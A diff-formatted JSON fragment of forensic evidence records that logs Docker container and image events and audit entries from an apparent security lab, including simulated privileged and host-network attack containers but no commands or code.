+      "timestamp": "2026-02-19T05:52:43.432928",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: 55aa17c0ec25, Name: dpff-registry",
+      "evidence_hash": "b08816e9d63b9da173079f75a3f38046fbad0ce2562eb542c3d707c543670be2",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:43.898183",
+      "source": "Docker",
+      "event_type": "Container stop",
+      "details": "Type: container, Action: stop, ID: 55aa17c0ec25, Name: dpff-registry",
+      "evidence_hash": "057c19e0e6f6aaf01941d0fac102132ba52a17a26f177429963fea41d6163bc2",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:43.909437",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 55aa17c0ec25, Name: dpff-registry",
+      "evidence_hash": "ac529c46f1313862ece68b3b920b20bec4b2bfc9184ce6568fdcd267913e4ab0",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:43.979498",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 55aa17c0ec25, Name: dpff-registry",
+      "evidence_hash": "c0b0c140687dbfacd8716ba673d2f8d020f35d37f150fac0eed69cbad004589d",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:44.008492",
+      "source": "Docker",
+      "event_type": "Container stop",
+      "details": "Type: container, Action: stop, ID: 24be5af3c61b, Name: dpff-gitea",
+      "evidence_hash": "f196435ea96ae6d4f59bcd220ec468fdc6738fcd38429036ecba5916f3ee3362",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:44.017208",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 24be5af3c61b, Name: dpff-gitea",
+      "evidence_hash": "a76917dac977b4cb1c914c4bab9672fba6265d1fe526c395b89db1641e8ed99c",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:44.130589",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 24be5af3c61b, Name: dpff-gitea",
+      "evidence_hash": "6b7a97706375a54b849125e7066c456831da1e0e23effde45e0e970001ba88d9",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:46.992134",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: e8f00bd4079f, Name: dpff-gitea",
+      "evidence_hash": "c5f6e03be9d6c3255044f15fac2614ca600b31ce031a84840334f8d18c707ffd",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:47.003236",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 0ab3c41aa985, Name: dpff-registry",
+      "evidence_hash": "4adf52b0014b706bcef9675c11c08b566807532c08022e266d7f3185f0275950",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:47.178630",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: ca359b1c8216, Name: dpff-jenkins",
+      "evidence_hash": "e5fd5a9305aaa188df1928069b26870099e8279428412adb9c47cffc8bf87099",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:47.658988",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 0ab3c41aa985, Name: dpff-registry",
+      "evidence_hash": "72b06abfdac01be400e30be67cfe5782c8522788f3e9d6d30baa2dc98d1e4237",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:47.717413",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: e8f00bd4079f, Name: dpff-gitea",
+      "evidence_hash": "0b43de078d51bbd9810de6f921f74004e34cad443b18308d3c128f7f449fabf8",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:52:48.128948",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: ca359b1c8216, Name: dpff-jenkins",
+      "evidence_hash": "b539f15e80f4add837c154c30e25a122d63fc7f8911b3ccfa658278db6107ae1",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:53:36.844873",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 5fa336d76fe0, Name: dpff-attack-06-privileged",
+      "evidence_hash": "4a8134b87ef62ba934a9053486a2e617bb0fafc3e84bb56a8ceb5c691561de62",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:53:37.635561",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 463d6b83847d, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "7501497a2fba50813b9929d9fc288db60ab4638e84e0b8ce0d6992bf9036eaf2",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:54:06.967332",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 5fa336d76fe0, Name: dpff-attack-06-privileged",
+      "evidence_hash": "b26692f3fd73587a7873a2c098f40ec8bfcaf9285e6653a65d350412545e56cc",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:54:07.205021",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 52afc1e4f83d, Name: dpff-attack-06-privileged",
+      "evidence_hash": "2db8d6a475651afcfce8e7084b82e303cef2f398873d7f633059f514e3f1cbfb",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:54:07.469062",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 52afc1e4f83d, Name: dpff-attack-06-privileged",
+      "evidence_hash": "40e4c192d8528a07b13e7b51fd656d75c4315bdd7e96ca09ed41680815c6b525",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:54:07.611783",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 463d6b83847d, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "8cdce80c800fc5b038051f3a9a40030fde98e13c548dcba45349d121cd5e52e6",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:54:07.881799",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 630935d1e83d, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "268135639b610f3cf648e34b790f650c6ce661efc9bfce8bcb17acfb93010e7c",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:54:08.133217",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 630935d1e83d, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "8c57aa44dedc4a3d4fcc19221ae480a7757d2e1722e94a4ededa1f112410610b",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:59:34.944137",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 52afc1e4f83d, Name: dpff-attack-06-privileged",
+      "evidence_hash": "357f8efcb5ef753d14df3dfe294fc08768947b7b928635e8684f2119c534e96e",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T05:59:35.540740",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 630935d1e83d, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "e6e3d7ae2956a348e0ae2798d5d765be77b5536c01ac1bb936ac42ba9ed44ecb",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:47.902216",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: ca359b1c8216, Name: dpff-jenkins",
+      "evidence_hash": "203475f9341a54f8f96decf6f0fcc76322699ae5c3f0758db335c2ea6b27a522",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:48.370100",
+      "source": "Docker",
+      "event_type": "Container stop",
+      "details": "Type: container, Action: stop, ID: ca359b1c8216, Name: dpff-jenkins",
+      "evidence_hash": "b522c4d0e8a81e0cfa8525e5b42616082cd32a2cf856cb56dc00afb60b20e8cd",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:48.376611",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: ca359b1c8216, Name: dpff-jenkins",
+      "evidence_hash": "42ee907ab3d5917347034c394a6f31bd816a2672e7cf420d247be1664834a30e",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:48.407537",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: ca359b1c8216, Name: dpff-jenkins",
+      "evidence_hash": "f7d088b54fc8404e2d03daf8add86bdf87c50c2d2b11b4317a5d93bae83e1733",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:48.435214",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: 0ab3c41aa985, Name: dpff-registry",
+      "evidence_hash": "68accf2e991f3b88f5ab03abbd050b9c0d0b75ab003f7b2e34b14d183577792a",
+      "collected_at": "2026-02-19T13:31:33.959817"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:48.439079",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: e8f00bd4079f, Name: dpff-gitea",
+      "evidence_hash": "2d35edcbd74e26c1233e7167e455fc2b8b03a8a8403b01c109b28895a19bdbed",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:48.814364",
+      "source": "Docker",
+      "event_type": "Container stop",
+      "details": "Type: container, Action: stop, ID: 0ab3c41aa985, Name: dpff-registry",
+      "evidence_hash": "f0e546c2da48fd049065ea33e00a796386245bb30d60770417229138943591a9",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:48.821126",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 0ab3c41aa985, Name: dpff-registry",
+      "evidence_hash": "4a6b39bc450252858dbcbc31c7b81d32257f548082d0515a8ea464ae6de71c00",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:48.853152",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 0ab3c41aa985, Name: dpff-registry",
+      "evidence_hash": "b0f5b31d326d6b194dfb27490453b3b65a53a40acc977219b6dd685d18cf2b1a",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:48.952418",
+      "source": "Docker",
+      "event_type": "Container stop",
+      "details": "Type: container, Action: stop, ID: e8f00bd4079f, Name: dpff-gitea",
+      "evidence_hash": "2ffe0da50d03a97dd56dcefc09dcbc864a0cb419b065c6e402b833c896a303c2",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:48.957839",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: e8f00bd4079f, Name: dpff-gitea",
+      "evidence_hash": "1acd12f75e390e7563efdef02571a72173cd9e150cde8ac368a94b5e93fb4755",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:02:49.024358",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: e8f00bd4079f, Name: dpff-gitea",
+      "evidence_hash": "817fd487270803e144040ffcee3fbb524a016a0d01ce926acbf0bea564b33ca8",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:06:27.764941",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:97bb6, Name: sha256:97bb693f5c1a10e61f5a3656cf27e4749b3def583b1f88bdc2a11202f10b20a9",
+      "evidence_hash": "2d823861d492708fd2343a169b0465f4ad2bc50da52fe353bcc61356ac1e4c96",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:06:27.789460",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:97bb6, Name: lab-jenkins:latest",
+      "evidence_hash": "c5b51c4c97319541b9e84578214ab2edafb698e6c344309d661f1f5c17ae4cd1",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:07:16.279703",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: d2b49c47db20, Name: dpff-gitea",
+      "evidence_hash": "633d26794c1673d6932b014bfe61504ba5beacd8ba2c2cfd5ac1269a4c4d18eb",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:07:16.376158",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 8e6f84cd85b1, Name: dpff-registry",
+      "evidence_hash": "34070f7ec3e828faef1fdfe41d24796979d492204b73483cb3a7e41d17c67d04",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:07:17.162153",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: bb01db573fe5, Name: dpff-jenkins",
+      "evidence_hash": "48034d8e9aeb500b4f6e038d77305b6a95c2ae439e1de3ea4e1c9f245cf53c77",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:07:18.308828",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 8e6f84cd85b1, Name: dpff-registry",
+      "evidence_hash": "1481e14c64fc5e4dd0aceed81b63692488bde28ab052bc344338dd64c49e2e15",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:07:18.365341",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: d2b49c47db20, Name: dpff-gitea",
+      "evidence_hash": "9ee7604f7c60333df97b9b02e8abb3f25f709d97d64ace76db8c717a9dde69c1",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:07:18.673838",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: bb01db573fe5, Name: dpff-jenkins",
+      "evidence_hash": "f2af7289d34bb845b6f47fed882bbaec461af8adb2f33950948f1f0bbfe294ac",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:09:15.700109",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 52afc1e4f83d, Name: dpff-attack-06-privileged",
+      "evidence_hash": "c4f1705b0d0d02f59ebaaf42e95f652914208dd24fb079bc85b23fee81e3a551",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:09:15.912295",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 315e1c6ea795, Name: dpff-attack-06-privileged",
+      "evidence_hash": "4d91ce06519ed0b92bbd06b29d1d9b19d832a87470a86940ecbfb755ca59fc71",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:09:16.091485",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 315e1c6ea795, Name: dpff-attack-06-privileged",
+      "evidence_hash": "ca8b832de3350f5cb6450daaba54d1308e255ed50a2257e0cb8eebc6c9eab6f0",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:09:16.188010",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 630935d1e83d, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "0892bca0661cfe63143e2fab137f4f9aa4ca54a3ea98a4005de2ba602c163f77",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:09:16.340822",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: e5350d8787a8, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "7c976837a2bd92b44297b4f5890df9cc08245ce5eaa539727aa7c1206fcc3d38",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:09:16.497860",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: e5350d8787a8, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "f52f0bff0c6bb2d25a9a14e0eb96a81d11e90ae6d8398a2f71eb9c85c0805994",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:28.615260",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:5a0ff, Name: sha256:5a0ff64ee7a13bc4d6e2996728a9802aa97bd9bd4bcf6ae8c6d3163157bd18df",
+      "evidence_hash": "2154645f72cd35b74b6f4b6e03032183bf36cb9ac850ce79366a9d2e53aeb5f2",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:28.625814",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:5a0ff, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "2e83094940861559c872a9c26d468783de6433d3d3ac4aaa7ffdcae5a619c645",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:29.646569",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "264b943b638cf10e26383bbc54501338fdb6affb31be09d569ae57a5859dbc5b",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:30.989546",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:7c65b, Name: sha256:7c65b18f6d804a18e8cec52adcceff179ee1ee7c31f3367c52ef40f19ad552ac",
+      "evidence_hash": "d25a981f20c0c88c2930131ea2a3f93149cc635bd285c43a472286e3abe23614",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:31.005519",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:7c65b, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "388fa31227f4309315535d2ae7e655c284f901fd8c9609cfd2d7a38283b3514a",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:32.038065",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "478cdb19ec008d2ce1aa073879b1cd586d044a18090bde36341324e5f12b71f0",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:38.612217",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: 315e1c6ea795, Name: dpff-attack-06-privileged",
+      "evidence_hash": "3affbd5dfafeea0b949ee21ef6108a61af2f41ff37c625b1a0e6debd051f25c3",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:38.675950",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 315e1c6ea795, Name: dpff-attack-06-privileged",
+      "evidence_hash": "d98c9772dd8d0541fda803879d9d6b8ae123a854ff79647cb0c7c6c25282847a",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:38.699810",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: 315e1c6ea795, Name: dpff-attack-06-privileged",
+      "evidence_hash": "7d6266128b44fddf42053b812fa1f8d0f861e52e2755a3e1ed2d8c69b0a5b972",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:38.825120",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 764fdde5767b, Name: dpff-attack-06-privileged",
+      "evidence_hash": "1118f1edc8c6a6ca095ed5ff3a3a6dae98c744ffb4afedc67bb34bf0be8288d4",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:38.973020",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 764fdde5767b, Name: dpff-attack-06-privileged",
+      "evidence_hash": "cbb840dd10dd100bec32cfb8fb396a426e212ec298d2b82dd8700def57b63929",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:39.042725",
+      "source": "Docker",
+      "event_type": "Container kill",
+      "details": "Type: container, Action: kill, ID: e5350d8787a8, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "e69bf3bc7559f82e43baea9c57035aa68155b210d9f4a2382a21ce8db5cf7e90",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:39.132714",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: e5350d8787a8, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "236b005351a38669552858fb6c1abac3e46012fe37b24fdad9aadd17a7d01b70",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:39.161159",
+      "source": "Docker",
+      "event_type": "Container destroy",
+      "details": "Type: container, Action: destroy, ID: e5350d8787a8, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "b6bb09cb19cd80b622316be44cfe701cff96fa7790b4802e0e83605a03c8fc16",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:39.291502",
+      "source": "Docker",
+      "event_type": "Container create",
+      "details": "Type: container, Action: create, ID: 138801ac966d, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "6b891b0a120c62b624e7fa78077b65dd194831a8acd269f1279b2b32a5f36f68",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:39.427958",
+      "source": "Docker",
+      "event_type": "Container start",
+      "details": "Type: container, Action: start, ID: 138801ac966d, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "7a04a2cde987853759cf3442f45c458b98d2f9ddaa624a5110fc7b0dc9a85d3c",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:46.298168",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:f39c3, Name: sha256:f39c3f57fa6a9fe874317376d60b7133094961c6cbf416d8ddd7e9f45f0fb8f5",
+      "evidence_hash": "0d55a57a20ca8950cfa2c61c5c88953dd61fa199f1ca6ea7d6eaf6477f91d212",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:46.310094",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:f39c3, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "f4be5121daafb627ed84f9fe7391a159fe69635d12907b49ce41a6a61eb241b8",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:47.243840",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "a63499e6b680c05cdc187f3f4dcf1cbfe036e3c87ec70596d4527814017bfb10",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:48.529718",
+      "source": "Docker",
+      "event_type": "Image create",
+      "details": "Type: image, Action: create, ID: sha256:6674b, Name: sha256:6674bdebba334197ba590cdf13741b6b771a3c59200fd5919ca8d202be622c20",
+      "evidence_hash": "87248da40464946325bcbab0a919d46c099569e95893487a5386f21530250bde",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:48.541470",
+      "source": "Docker",
+      "event_type": "Image tag",
+      "details": "Type: image, Action: tag, ID: sha256:6674b, Name: localhost:5000/dpff-sample-app:release-1.0",
+      "evidence_hash": "fb479f75cbd12e611739a2c30ce092ff9bf75442e03d95ea9f98af509d9b5fab",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:49.485927",
+      "source": "Docker",
+      "event_type": "Image push",
+      "details": "Type: image, Action: push, ID: localhost:50, Name: localhost:5000/dpff-sample-app, Tag: localhost:5000/dpff-sample-app",
+      "evidence_hash": "94f6569177cf1e322faa683d1983397e044eb7a4cc3092f98086cd413f1acc99",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:18:06.366716",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 764fdde5767b, Name: dpff-attack-06-privileged",
+      "evidence_hash": "b2f60cb3904280823459900e709f423d580aaea4f5c07575df392212819bcaa4",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:18:06.759113",
+      "source": "Docker",
+      "event_type": "Container die",
+      "details": "Type: container, Action: die, ID: 138801ac966d, Name: dpff-attack-06-hostnet",
+      "evidence_hash": "c495434e4a8ee5c79bafe2240b60166e2bfcd661f52e0db468bc657b9d7c3e19",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:39",
+      "source": "Docker",
+      "event_type": "Container Audit",
+      "details": "Container: dpff-attack-06-hostnet, Image: alpine:latest, Status: exited [PRIVILEGED: hostNetwork=true]",
+      "evidence_hash": "88e037ef22e1829ab943469b20c65cd4a5708ebe6e11d4191fe2edc7a71eb07a",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:12:38",
+      "source": "Docker",
+      "event_type": "Container Audit",
+      "details": "Container: dpff-attack-06-privileged, Image: alpine:latest, Status: exited [PRIVILEGED: privileged=true, hostNetwork=true, hostPID=true]",
+      "evidence_hash": "4eef91280454a26fbf38737dab6ad50590f3bb55b473b380768d46c27af09b76",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:07:16",
+      "source": "Docker",
+      "event_type": "Container Audit",
+      "details": "Container: dpff-jenkins, Image: lab-jenkins:latest, Status: running",
+      "evidence_hash": "61365dfbc8613fd8c49c0f53f17cc058eb17664c8c17c09054ec65122eba8210",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:07:11",
+      "source": "Docker",
+      "event_type": "Container Audit",
+      "details": "Container: dpff-registry, Image: registry:2, Status: running",
+      "evidence_hash": "507b14f8e7375643c1b7106c8098abb09422a1885c553a175a75f616dc8ff0b8",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-02-19T06:07:11",
+      "source": "Docker",
+      "event_type": "Container Audit",
+      "details": "Container: dpff-gitea, Image: gitea/gitea:latest, Status: running",
+      "evidence_hash": "cf497a81183ea8f3d654051623022a348695b4c61d1dd35ca29b118eb0296601",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    },
+    {
+      "timestamp": "2026-01-28T19:48:21",
+      "source": "Docker",
+      "event_type": "Container Audit",
+      "details": "Container: jenkins-controller, Image: jenkins/jenkins:lts, Status: exited",
+      "evidence_hash": "fb253f5e1a14e5d3989112b002d096465183356386dc8224f367f5374821aead",
+      "collected_at": "2026-02-19T13:31:33.960345"
+    }
+  ]
+}
